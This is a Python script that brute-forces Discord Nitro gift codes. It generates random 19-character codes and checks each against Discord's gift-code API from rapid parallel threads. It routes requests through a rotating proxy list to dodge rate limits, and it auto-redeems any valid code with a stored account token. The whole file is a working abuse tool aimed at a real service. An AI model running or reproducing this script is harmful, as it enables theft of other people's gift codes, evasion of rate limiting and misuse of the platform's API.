import random
import string
import requests
from requests.exceptions import HTTPError
import threading
import time
import random_proxies
import json
import ctypes

token = open('token.txt').read()
print(token)
proxies = open('proxy.txt').read().split('\n')

invalid = 0
valid = 0
rlimit = 0
errors = 0

def stat():
    ctypes.windll.kernel32.SetConsoleTitleW("Bad: "+str(invalid) + ' | '+'Good: '+str(valid)+ ' | '+'RateLimited: '+str(rlimit) + ' | '+'Errors: '+ str(errors)+' | '+'Token: ' +token)


stat()


def gencode():
	letters = string.ascii_letters + string.digits
	return ''.join(random.choice(letters) for i in range(19))



def reedem(code):
    requests.post('https://discordapp.com/api/v6/entitlements/gift-codes/'+str(code)+'/redeem', headers={'Authorization': str(token)})

	
def check():
    try:
        code = gencode()
        proxy = random.choice(proxies)
        response = requests.get("https://discord.com/api/v7/entitlements/gift-codes/" + code + "?with_application=false&with_subscription_plan=true", proxies=dict(https='https://' + proxy), timeout=5)
        data = response.json()
        if data["message"] != 'Unknown Gift Code' and data["message"] != 'You are being rate limited.':
            reedem(code)
            print("Worked: " + code)
            file = open("workedcodes.txt", "a+")
            file.write("\n" + code)
            global valid
            valid = valid+1
        if data['message'] == 'Unknown Gift Code':
            print('Bad Code '+code)
            global invalid
            invalid = invalid+1
        elif data["message"] == 'You are being rate limited.':
            print('Rate Limited Code '+code)
            global rlimit
            rlimit=rlimit+1
        stat()
    except:
        print('Error/Bad Proxy')
        global errors
        errors = errors+1
        stat()


def main():
    while True:
        t = threading.Thread(target=check)
        t.start()
        time.sleep(0.01)

main()
